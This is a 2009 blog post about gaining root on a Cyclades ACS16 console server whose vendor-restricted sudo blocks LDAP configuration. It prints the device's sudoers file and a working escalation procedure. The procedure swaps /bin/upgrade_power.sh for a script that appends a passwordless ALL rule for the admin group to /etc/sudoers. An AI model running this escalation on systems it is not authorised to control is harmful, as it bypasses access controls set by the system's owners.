Title: root on a Cyclades ACS console server
Date: 2009-11-18 16:21
Author: admin
Category: Hardware
Tags: acs, cyclades, gettingroot
Slug: root-on-a-cyclades-acs-console-server

At work we have a Cyclades ACS16 console server (running
Cyclades-ACS16-Linux V\_3.2.0 (Jan/04/08)). While the docs claim all
sorts of LDAP features, there's nothing (either in the web GUI or the
CLI configuration tool) to setup LDAP with TLS or required group
membership. I tried modifying the /etc/ldap.conf and /etc/nsswitch.conf
files, running `saveconf` and `runconf` and even rebooting, but no luck.
It was apparent that I needed root on the box. Unfortunately, they don't
give you root, and their sudo command is locked down. But, I figured, if
sudo would let me </code> and `chown` and `cat` and `mv` (enough to
switch out the ldap.conf and nsswitch.conf files), root should be pretty
easy.

The failing of Cyclades' sudo lockdown is that it allows sudo execution
of a few random shell scripts, and also allows \`mv\`.

The `/etc/sudoers`:

~~~~{.text}
# sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# User alias specification

# Runas alias specification

# Host alias specification

# Cmnd alias specification
Cmnd_Alias     SH_CMDS = /bin/cp,  
                        /bin/chown,  
                        /bin/egrep,  
                        /bin/grep,  
                        /bin/cat,  
                        /bin/tar,  
                        /bin/kill,  
                        /bin/mkdir,  
                        /bin/mv,  
                        /bin/rm,  
                        /bin/sed,  
                        /bin/touch,  
                        /sbin/reboot,  
                        /usr/bin/killall,  
                        /usr/bin/w,  
                        /bin/w_cas,  
                        /bin/sess_mngt,  
                        /sbin/route,  
                        /bin/what

Cmnd_Alias     CONF_FILES = /bin/vi /etc/network/st_routes,  
                           /bin/vi /etc/portslave/pslave.conf,  
                           /bin/vi /etc/resolv.conf

Cmnd_Alias     APPLICATIONS = /bin/pmCommand,  
                             /bin/saveconf,  
                             /bin/restoreconf,  
                             /bin/runconf,  
                             /bin/daemon.sh,  
                             /bin/manageService.sh,  
                             /bin/dsviewKillAdmin,   
                             /bin/pmfwupgrade,   
                             /bin/adsap2_clear,   
                             /bin/upgrade_power.sh,   
                             /bin/signal_ras

# User privilege specification
# root can run any command on any host as any user.
root    ALL = (ALL) ALL

# admin user group command specification.
%admin      ALL = NOPASSWD: SH_CMDS, CONF_FILES, APPLICATIONS
~~~~

So, /bin/upgrade\_power.sh doesn't look like we're using it too much.
Here's our root procedure. Before doing this, create the
`/home/admin/foo.sh` script.

~~~~{.bash}
sudo cp /bin/upgrade_power.sh /bin/upgrade_power.sh.SAVE
sudo chown root:root /home/admin/foo.sh
sudo mv /home/admin/foo.sh /bin/upgrade_power.sh
sudo /bin/upgrade_power.sh
sudo cat /etc/sudoers # just to verify that it worked
sudo mv /bin/upgrade_power.sh.SAVE /bin/upgrade_power.sh # set things back to the way they were
~~~~

And the key to all of it is the simple `/home/admin/foo.sh` script:

~~~~{.bash}
#!/bin/bash

chmod u+w /etc/sudoers
echo "%admin      ALL = NOPASSWD: ALL" >> /etc/sudoers
chmod u-w /etc/sudoers
~~~~

That's it!
